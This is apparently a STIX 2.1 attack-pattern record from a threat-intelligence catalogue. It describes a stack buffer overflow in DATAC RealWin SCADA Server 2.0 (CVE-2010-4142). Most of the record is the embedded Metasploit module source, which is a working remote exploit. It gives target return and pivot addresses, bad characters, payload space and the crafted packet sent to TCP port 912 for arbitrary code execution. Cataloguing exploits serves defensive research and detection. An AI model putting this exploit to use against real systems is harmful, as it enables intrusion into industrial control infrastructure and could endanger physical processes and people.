{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45a71992-8384-427c-9951-22d25d298b7f",
    "created": "2024-08-14T16:39:31.733131Z",
    "modified": "2024-08-14T16:39:31.733135Z",
    "name": "DATAC RealWin SCADA Server SCPC_TXTEVENT Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in DATAC Control International RealWin SCADA Server 2.0 (Build 6.1.8.10). By sending a specially crafted packet an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/realwin_scpc_txtevent.rb",
            "external_id": "realwin_scpc_txtevent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4142"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DATAC RealWin SCADA Server SCPC_TXTEVENT Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in DATAC Control\n        International RealWin SCADA Server 2.0 (Build 6.1.8.10).\n        By sending a specially crafted packet,\n        an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'Luigi Auriemma', 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-4142'],\n          [ 'OSVDB', '68812'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 550,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Universal', { 'Pivot' => 0x40017fc2, 'Ret' => 0x4001f6d0 } ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-11-18'))\n\n    register_options([Opt::RPORT(912)])\n  end\n\n  def exploit\n\n    connect\n\n    data =  [0x6a541264].pack('V')\n    data << [0x00000010].pack('V')\n    data << [0x00001ff4].pack('V')\n    data << rand_text_alpha_upper(164)\n    data << [target['Pivot']].pack('V')\n    data << rand_text_alpha_upper(16)\n    data << [target.ret].pack('V')\n    data << payload.encoded\n    data << rand_text_alpha_upper(10024 - payload.encoded.length)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(data)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-18",
    "x_mitre_platforms": [
        "win'"
    ]
}